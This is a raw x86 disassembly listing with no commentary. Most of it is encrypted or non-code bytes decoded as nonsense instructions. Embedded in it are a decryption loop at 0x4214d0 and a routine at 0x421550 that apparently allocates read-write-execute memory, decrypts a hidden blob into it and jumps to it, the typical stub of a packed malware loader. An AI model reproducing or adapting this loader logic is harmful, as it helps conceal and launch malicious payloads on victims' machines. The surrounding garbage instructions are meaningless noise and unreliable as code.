  42132a:	cmp    BYTE PTR [edx+0x3a69d558],bh
  421330:	lods   eax,DWORD PTR ds:[esi]
  421331:	hlt    
  421332:	(bad)  
  421334:	push   edx
  421335:	bound  ebx,QWORD PTR [ecx-0x74]
  421338:	mov    ch,0x1f
  42133a:	cmp    DWORD PTR [ebp+0x5c6d7f83],esi
  421340:	stc    
  421341:	pop    edx
  421342:	cmp    eax,0x6a83d7dd
  421347:	cmp    BYTE PTR [edi],bl
  421349:	dec    ebp
  42134a:	in     al,dx
  42134b:	add    eax,0x4aba08c4
  421350:	xchg   ebp,eax
  421351:	or     al,BYTE PTR [edi+0x4b]
  421354:	dec    esi
  421355:	xor    eax,0x8ad8891e
  42135a:	std    
  42135b:	mov    ds:0xffafcea0,eax
  421360:	sub    DWORD PTR ds:0x243ce7cd,edx
  421366:	adc    ebx,DWORD PTR [ecx+0x70]
  421369:	or     BYTE PTR [bx-0x75fe],al
  42136e:	loop   0x421351
  421370:	mov    ebp,0x717724dd
  421375:	test   al,0xc9
  421377:	jb     0x4213f1
  421379:	xor    al,0x3c
  42137b:	jnp    0x421302
  42137d:	push   0xab6087fc
  421382:	cwde   
  421383:	popa   
  421384:	inc    ebx
  421385:	mov    al,0x54
  421387:	iret   
  421388:	dec    esi
  421389:	int    0x12
  42138b:	pusha  
  42138c:	fldenv [edi+0x68]
  42138f:	mov    esi,0x7d423115
  421394:	fnstenv [ecx+edi*8]
  421397:	pusha  
  421398:	jmp    0x421334
  42139a:	std    
  42139b:	test   BYTE PTR [ebp+0x4d],dl
  42139e:	(bad)  
  42139f:	div    ebp
  4213a1:	fcmovb st,st(1)
  4213a3:	outs   dx,BYTE PTR ds:[esi]
  4213a4:	pop    ebx
  4213a5:	pop    ds
  4213a6:	cmp    ch,BYTE PTR [ecx+0x5dfe978f]
  4213ac:	sbb    eax,DWORD PTR [esi-0x5ceb6a9b]
  4213b2:	stos   BYTE PTR es:[edi],al
  4213b3:	es xchg ebp,eax
  4213b5:	dec    esi
  4213b6:	stos   DWORD PTR es:[edi],eax
  4213b7:	mov    BYTE PTR [edx+0x14],0x9e
  4213bb:	clc    
  4213bc:	int3   
  4213bd:	rcr    BYTE PTR [ecx],1
  4213bf:	mov    ebx,DWORD PTR [eax]
  4213c1:	push   ebp
  4213c2:	and    BYTE PTR [ecx+0x87e2f2b],ah
  4213c8:	xchg   edi,eax
  4213c9:	(bad)  
  4213ca:	and    DWORD PTR [ebx+0x1],ebp
  4213cd:	daa    
  4213ce:	xchg   ecx,eax
  4213cf:	das    
  4213d0:	pop    edx
  4213d1:	punpckhwd mm5,mm7
  4213d4:	mov    esi,0x33aa7b7d
  4213d9:	repz aaa 
  4213db:	mov    ch,0x17
  4213dd:	inc    esp
  4213de:	nop
  4213df:	xor    al,BYTE PTR [eax]
  4213e1:	mov    al,ds:0x5f89f5b6
  4213e6:	push   ecx
  4213e7:	into   
  4213e8:	cmp    ebp,0x7b603743
  4213ee:	loop   0x42141f
  4213f0:	push   cs
  4213f1:	ret    
  4213f2:	out    0x5e,eax
  4213f4:	loop   0x4213fa
  4213f6:	dec    eax
  4213f7:	out    0x13,al
  4213f9:	fcomp  QWORD PTR [esi+0x40]
  4213fc:	mov    ebp,0x46c284df
  421401:	in     al,0x41
  421403:	rol    bl,0x1f
  421406:	addr16 pop edx
  421408:	dec    eax
  421409:	sbb    DWORD PTR [ebx+0xe],edi
  42140c:	shl    DWORD PTR [esi+ebp*2],cl
  42140f:	out    0x9d,eax
  421411:	cmp    al,0xa9
  421413:	dec    edx
  421414:	sbb    BYTE PTR ds:0x8be3c128,bl
  42141a:	add    ecx,DWORD PTR [ebp-0x398b6aed]
  421420:	dec    esp
  421421:	cdq    
  421422:	pop    esp
  421423:	push   esp
  421424:	aas    
  421425:	rcr    DWORD PTR [edi-0x4a],cl
  421428:	je     0x4214a7
  42142a:	jle    0x4213ea
  42142c:	iret   
  42142d:	jbe    0x4213fc
  42142f:	les    ebp,FWORD PTR [edx-0x69ec586b]
  421435:	mov    ecx,0x497ea6b4
  42143a:	jns    0x421488
  42143c:	sbb    eax,DWORD PTR [ebx-0x4d1fa1f3]
  421442:	and    BYTE PTR [edi-0x57a27a97],cl
  421448:	inc    BYTE PTR [edx+edx*2-0x30a173c1]
  42144f:	int3   
  421450:	or     al,0x3
  421452:	push   esi
  421453:	cmp    BYTE PTR [ecx-0x2fb45a8c],ch
  421459:	mov    gs,WORD PTR [ebp+eiz*4+0x1f]
  42145d:	enter  0x8fea,0xef
  421461:	nop
  421462:	stc    
  421463:	add    eax,0xf5fc4d36
  421468:	mov    esi,0xb2d08a07
  42146d:	fisubr WORD PTR [esi-0x6756196f]
  421473:	retf   
  421474:	jge    0x421448
  421476:	in     al,0xcb
  421478:	gs out dx,eax
  42147a:	jmp    0x4213fe
  42147c:	nop
  42147d:	dec    ecx
  42147e:	xlat   BYTE PTR ds:[ebx]
  42147f:	iret   
  421480:	sbb    DWORD PTR [esi+0x64d5fcd],ecx
  421486:	add    ch,BYTE PTR [esi+0x7e26c225]
  42148c:	mov    ebp,0x55a85d25
  421491:	or     BYTE PTR [ecx-0x225aa82],ch
  421497:	sbb    esp,DWORD PTR [ecx-0x4a]
  42149a:	mov    WORD PTR [ebx],fs
  42149c:	xchg   ebp,eax
  42149d:	rcr    dl,cl
  42149f:	or     ecx,edx
  4214a1:	sbb    al,0x17
  4214a3:	test   DWORD PTR gs:[edx-0x76],esp
  4214a7:	adc    ah,cl
  4214a9:	pop    ebx
  4214aa:	pop    ds
  4214ab:	adc    BYTE PTR [ebp-0x7c],0x78
  4214af:	in     al,0x0
  4214b1:	dec    ebx
  4214b2:	test   bh,ah
  4214b4:	imul   esp,DWORD PTR [ecx+0x2ac96ddc],0xb8b0de97
  4214be:	xor    BYTE PTR [eax+ebx*2-0x182e4aca],0xba
  4214c6:	cmp    al,0x4e
  4214c8:	pop    ebp
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0xe45f764b
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0xc3ceb5d1
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	call   DWORD PTR [edi-0x5f]
  421830:	loopne 0x4217ed
  421832:	hlt    
  421833:	pop    eax
  421834:	xchg   al,bl
  421836:	jo     0x421826
  421838:	aaa    
  421839:	mov    bh,0x4
  42183b:	in     eax,0xfb
  42183d:	jo     0x421842
  42183f:	neg    DWORD PTR [eax-0x7a]
  421842:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421846:	idiv   ebx
  421848:	sbb    bh,bl
  42184a:	jo     0x421807
  42184c:	neg    DWORD PTR [eax-0x7a]
  42184f:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421853:	mov    bh,0xfb
  421855:	sbb    bh,bl
  421857:	jo     0x421814
  421859:	neg    DWORD PTR [eax-0x7a]
  42185c:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421860:	mov    bh,0xfb
  421862:	sbb    bh,bl
  421864:	jo     0x421821
  421866:	neg    DWORD PTR [eax-0x7a]
  421869:	fmul   DWORD PTR [esi+ebp*8+0x5f5b737]
  421870:	inc    ecx
  421871:	jle    0x42182e
  421873:	inc    ebx
  421874:	push   ecx
  421875:	dec    ebx
  421876:	stc    
  421877:	int3   
  421878:	out    dx,eax
  421879:	jnp    0x4218f5
  42187b:	fimul  DWORD PTR [esi-0x6d]
  42187e:	sbb    eax,ecx
  421880:	xlat   BYTE PTR ds:[ebx]
  421881:	sub    ah,dh
  421883:	mov    bh,0x13
  421885:	pushf  
  421886:	push   esi
  421887:	fcmovu st,st(3)
  421889:	jns    0x421825
  42188b:	push   ds
  42188c:	aad    0x98
  42188e:	sub    al,0xa6
  421890:	mov    edx,0xc245ce11
  421895:	xchg   ebp,eax
  421896:	cmp    dl,BYTE PTR [edx+0x17b39b1e]
  42189c:	aad    0xf8
  42189e:	sbb    DWORD PTR [ecx+0x17d5d253],eax
  4218a4:	idiv   BYTE PTR [edx-0x61]
  4218a7:	neg    DWORD PTR [eax-0x7a]
  4218aa:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  4218ae:	mov    al,0x62
  4218b0:	out    0xa2,al
  4218b2:	xor    eax,DWORD PTR [ebx+0x65]
  4218b5:	push   edx
  4218b6:	lds    esp,FWORD PTR [eax]
  4218b8:	out    0xe4,al
  4218ba:	je     0x42190b
  4218bc:	imul   edx,DWORD PTR [eax],0xfdb715a3
  4218c2:	pop    es
  4218c3:	jle    0x42190f
  4218c5:	jle    0x42187d
  4218c7:	push   edx
  4218c8:	(bad)  
  4218c9:	icebp  
  4218ca:	fadd   DWORD PTR [ebx]
  4218cc:	loop   0x42187f
  4218ce:	scas   eax,DWORD PTR es:[edi]
  4218cf:	cmp    eax,0x161cd2bf
  4218d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218d5:	mov    ebp,0x7ac294d7
  4218da:	std    
  4218db:	bswap  edx
  4218dd:	mov    WORD PTR [edx-0x2c2000c],ss
  4218e3:	add    ecx,DWORD PTR [eax-0x9c4c50f]
  4218e9:	push   edx
  4218ea:	fisub  WORD PTR [eax]
  4218ec:	out    0xe4,al
  4218ee:	je     0x42193f
  4218f0:	push   0x2989d310
  4218f5:	std    
  4218f6:	out    0x5e,eax
  4218f8:	pop    eax
  4218f9:	jle    0x42189e
  4218fb:	iret   
  4218fc:	and    eax,0x4d9e42f1
  421901:	mov    cl,0xff
  421903:	mov    al,ds:0x8b2cd214
  421908:	aas    
  421909:	mov    ebp,0x7a69e2b9
  42190e:	jecxz  0x4218a2
  421910:	push   edi
  421911:	mov    WORD PTR [edx-0x1ac28374],ds
  421917:	xchg   edx,eax
  421918:	jns    0x4218ad
  42191a:	xor    eax,DWORD PTR [ebx+0x65]
  42191d:	push   edx
  42191e:	xchg   al,bl
  421920:	je     0x421910
  421922:	aaa    
  421923:	mov    bh,0xfb
  421925:	sbb    ch,BYTE PTR [ebx+0x14f7bb35]
  42192b:	xchg   edx,ebx
  42192d:	je     0x42197d
  42192f:	out    0xdc,eax
  421931:	mov    ah,0x1a
  421933:	sti    
  421934:	jo     0x4218f1
  421936:	neg    DWORD PTR [eax-0x7a]
  421939:	fcom   DWORD PTR [esi+ebp*8+0x1bf0b634]
  421940:	icebp  
  421941:	jo     0x4218fe
  421943:	sbb    DWORD PTR [esi+eax*4-0x28],ebx
  421947:	enter  0x37e8,0xb7
  42194b:	sti    
  42194c:	sbb    bh,bl
  42194e:	popa   
  42194f:	push   es
  421950:	neg    DWORD PTR [eax-0x7a]
  421953:	enter  0xee74,0x37
  421957:	mov    bh,0xfe
  421959:	sbb    bh,bl
  42195b:	jo     0x421957
  42195d:	neg    DWORD PTR [eax-0x6a]
  421960:	fdiv   DWORD PTR [esi+ebp*8+0x35]
  421964:	mov    bh,0xfb
  421966:	pop    ds
  421967:	sti    
  421968:	jno    0x421925
  42196a:	neg    DWORD PTR [eax-0x7a]
  42196d:	fdiv   DWORD PTR [ecx-0x12]
  421970:	ss mov bh,0xfb
  421973:	sbb    bh,bl
  421975:	jo     0x421932
  421977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421978:	push   esp
  421979:	xchg   al,bl
  42197b:	jo     0x42196b
  42197d:	aaa    
  42197e:	mov    dh,0x1f
  421980:	pop    ds
  421981:	sti    
  421982:	jb     0x42193f
  421984:	neg    eax
  421986:	xchg   al,bl
  421988:	fs out dx,al
  42198a:	aaa    
  42198b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42198c:	sti    
  42198d:	sbb    bh,bl
  42198f:	jo     0x42193c
  421991:	neg    DWORD PTR [eax-0x6a]
  421994:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421998:	mov    bh,0xfb
  42199a:	or     bh,bl
  42199c:	jo     0x421959
  42199e:	neg    DWORD PTR [eax-0x7a]
  4219a1:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  4219a5:	mov    bh,0xf
  4219a7:	and    esi,edi
  4219a9:	jo     0x42197d
  4219ab:	hlt    
  4219ac:	pop    eax
  4219ad:	xchg   al,bl
  4219af:	test   ch,ah
  4219b1:	aaa    
  4219b2:	clc    
  4219b3:	mov    dl,0x1a
  4219b5:	sti    
  4219b6:	jo     0x421973
  4219b8:	neg    DWORD PTR [eax-0x7a]
  4219bb:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  4219bf:	mov    bh,0xfb
  4219c1:	sbb    bh,bl
  4219c3:	jo     0x421980
  4219c5:	neg    DWORD PTR [eax-0x7a]
  4219c8:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  4219cc:	mov    bh,0xfb
  4219ce:	sbb    bh,bl
  4219d0:	jo     0x42198d
  4219d2:	neg    DWORD PTR [eax-0x7a]
  4219d5:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  4219d9:	mov    bh,0xfb
  4219db:	sbb    bh,bl
  4219dd:	jo     0x42199a
  4219df:	neg    DWORD PTR [eax-0x7a]
  4219e2:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  4219e6:	mov    bh,0xfb
  4219e8:	sbb    bh,bl
  4219ea:	jo     0x4219a7
  4219ec:	neg    DWORD PTR [eax-0x7a]
  4219ef:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  4219f3:	mov    bh,0xfb
  4219f5:	sbb    bh,bl
  4219f7:	jo     0x4219b4
  4219f9:	neg    DWORD PTR [eax-0x7a]
  4219fc:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421a00:	mov    bh,0xfb
  421a02:	sbb    bh,bl
  421a04:	jo     0x4219c1
  421a06:	neg    DWORD PTR [eax-0x7a]
  421a09:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421a0d:	mov    bh,0xfb
  421a0f:	sbb    bh,bl
  421a11:	jo     0x4219ce
  421a13:	neg    DWORD PTR [eax-0x7a]
  421a16:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421a1a:	mov    bh,0xfb
  421a1c:	sbb    bh,bl
  421a1e:	pop    esi
  421a1f:	iret   
  421a20:	xchg   edx,eax
  421a21:	and    dl,dh
  421a23:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421a27:	push   edi
  421a28:	lock sbb bh,bl
  421a2b:	pusha  
  421a2c:	mov    ebx,0xdc5258f7
  421a31:	je     0x421a21
  421a33:	xor    esi,DWORD PTR [edi+0x33be4afb]
  421a39:	mov    DWORD PTR [ebx+0x74d88617],esp
  421a3f:	out    dx,al
  421a40:	aaa    
  421a41:	mov    bh,0xdb
  421a43:	sbb    bh,bl
  421a45:	nop
  421a46:	xchg   ebp,eax
  421a47:	test   DWORD PTR [ebx],ebp
  421a49:	hlt    
  421a4a:	mov    ebx,0xb737ee74
  421a4f:	fwait
  421a50:	sbb    bh,bl
  421a52:	jo     0x421a9f
  421a54:	cld    
  421a55:	pop    eax
  421a56:	xchg   BYTE PTR [edx+0x6f37ee74],al
  421a5c:	call   FWORD PTR [edx]
  421a5e:	sti    
  421a5f:	jo     0x421a1c
  421a61:	neg    DWORD PTR [eax-0x7a]
  421a64:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421a68:	mov    bh,0xfb
  421a6a:	cmp    bh,bl
  421a6c:	jo     0x421ac9
  421a6e:	neg    DWORD PTR [eax-0x7a]
  421a71:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421a75:	mov    bh,0xfb
  421a77:	sbb    bh,bl
  421a79:	jo     0x421a36
  421a7b:	neg    DWORD PTR [eax-0x7a]
  421a7e:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421a82:	mov    bh,0xfb
  421a84:	sbb    bh,bl
  421a86:	jo     0x421a43
  421a88:	neg    DWORD PTR [eax-0x7a]
  421a8b:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421a8f:	mov    bh,0xfb
  421a91:	sbb    bh,bl
  421a93:	jo     0x421a50
  421a95:	neg    DWORD PTR [eax-0x7a]
  421a98:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421a9c:	mov    bh,0xfb
  421a9e:	sbb    bh,bl
  421aa0:	jo     0x421a5d
  421aa2:	neg    DWORD PTR [eax-0x7a]
  421aa5:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421aa9:	mov    bh,0xfb
  421aab:	sbb    bh,bl
  421aad:	jo     0x421a6a
  421aaf:	neg    DWORD PTR [eax-0x7a]
  421ab2:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421ab6:	mov    bh,0xfb
  421ab8:	sbb    bh,bl
  421aba:	jo     0x421a77
  421abc:	neg    DWORD PTR [eax-0x7a]
  421abf:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421ac3:	mov    bh,0xfb
  421ac5:	sbb    bh,bl
  421ac7:	jo     0x421a84
  421ac9:	neg    DWORD PTR [eax-0x7a]
  421acc:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421ad0:	mov    bh,0xfb
  421ad2:	sbb    bh,bl
  421ad4:	jo     0x421a91
  421ad6:	neg    DWORD PTR [eax-0x7a]
  421ad9:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421add:	mov    bh,0xfb
  421adf:	sbb    bh,bl
  421ae1:	jo     0x421a9e
  421ae3:	neg    DWORD PTR [eax-0x7a]
  421ae6:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421aea:	mov    bh,0xfb
  421aec:	sbb    bh,bl
  421aee:	jo     0x421aab
  421af0:	neg    DWORD PTR [eax-0x7a]
  421af3:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421af7:	mov    bh,0xfb
  421af9:	sbb    bh,bl
  421afb:	jo     0x421ab8
  421afd:	neg    DWORD PTR [eax-0x7a]
  421b00:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421b04:	mov    bh,0xfb
  421b06:	sbb    bh,bl
  421b08:	jo     0x421ac5
  421b0a:	neg    DWORD PTR [eax-0x7a]
  421b0d:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421b11:	mov    bh,0xfb
  421b13:	sbb    bh,bl
  421b15:	jo     0x421ad2
  421b17:	neg    DWORD PTR [eax-0x7a]
  421b1a:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421b1e:	mov    bh,0xfb
  421b20:	sbb    bh,bl
  421b22:	jo     0x421adf
  421b24:	neg    DWORD PTR [eax-0x7a]
  421b27:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421b2b:	mov    bh,0xfb
  421b2d:	sbb    bh,bl
  421b2f:	jo     0x421aec
  421b31:	neg    DWORD PTR [eax-0x7a]
  421b34:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421b38:	mov    bh,0xfb
  421b3a:	sbb    bh,bl
  421b3c:	jo     0x421af9
  421b3e:	neg    DWORD PTR [eax-0x7a]
  421b41:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421b45:	mov    bh,0xfb
  421b47:	sbb    bh,bl
  421b49:	jo     0x421b06
  421b4b:	neg    DWORD PTR [eax-0x7a]
